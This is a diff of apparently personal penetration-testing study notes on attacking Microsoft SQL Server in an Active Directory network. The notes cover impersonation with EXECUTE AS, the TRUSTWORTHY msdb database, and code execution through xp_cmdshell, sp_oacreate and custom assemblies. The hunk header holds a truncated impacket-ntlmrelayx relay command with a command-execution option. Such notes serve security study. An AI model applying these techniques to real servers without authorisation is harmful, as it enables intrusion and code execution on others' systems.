@@ -53,19 +53,17 @@ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 -c 'powe
 The goal is to obtain access to the user who is sysadmin in MSSQL - we can use the AD priv esc. We can also do impersonation with the usage of EXECUTE AS - only certain users can use impersonation; not every user has it, there must be misconfig. We can Impersonate on user and login (EXECUTE AS USER/LOGIN). We can enumerate which account allows impersonation, but we cannot enumerate who can impersonate them.
 For execute as USER we must do it on the msdb as it is TRUSTWORTHY with user dbo as he has sa.
 
-For Custom Assemblies we can use the CREATE ASSEMBLY procedure, but that also requires TRUSTWORTHY db. We import managed dll as an object and execute. To hex encode assembly we use the follow:
-#ps1 #encoding #hex #assembly
-
 #### Linked SQL Servers for Priv Escalation
-
 
 
 
 
 ### Getting code execution 
 
-To obtain code execution we can use: xp_cmdshell, sp_oacreate (Ole Automation Procedure) or through loading custom assembly.
+To obtain code execution we can use: xp_cmdshell, sp_oacreate (Ole Automation Procedure) or through loading custom assembly. Refer to the mssql-exp in code section for implementation.
 
+For Custom Assemblies we can use the CREATE ASSEMBLY procedure, but that also requires TRUSTWORTHY db. We import managed dll as an object and execute. To hex encode assembly we use the follow:
+[[Oneliners#^6217c2]]
 
 
 
